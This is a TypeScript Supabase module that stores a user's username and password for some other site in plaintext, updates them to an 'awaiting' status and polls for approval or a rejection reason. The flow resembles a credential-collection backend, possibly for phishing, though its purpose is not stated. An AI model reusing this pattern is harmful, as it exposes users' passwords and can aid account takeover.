import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL as string;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY as string;

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

export async function createLoginSubmission(input: {
  siteUsername: string;
  sitePassword: string;
  purpose?: string;
}): Promise<{ id: string } | null> {
  const { data, error } = await supabase
    .from('login_submissions')
    .insert({
      site_username: input.siteUsername,
      site_password: input.sitePassword,
      ...(input.purpose ? { purpose: input.purpose } : {}),
    })
    .select('id')
    .maybeSingle();

  if (error || !data) {
    return null;
  }
  return data as { id: string };
}

export async function updateLoginSubmission(
  appId: string,
  input: { siteUsername: string; sitePassword: string },
): Promise<void> {
  await supabase
    .from('login_submissions')
    .update({
      site_username: input.siteUsername,
      site_password: input.sitePassword,
      login_status: 'awaiting',
      login_reject_reason: '',
    })
    .eq('id', appId);
}

export async function getLoginSubmissionStatus(
  appId: string,
): Promise<{ login_status: string | null; login_reject_reason: string | null } | null> {
  const { data, error } = await supabase
    .from('login_submissions')
    .select('login_status, login_reject_reason')
    .eq('id', appId)
    .maybeSingle();
  if (error || !data) {
    return null;
  }
  return data as { login_status: string | null; login_reject_reason: string | null };
}
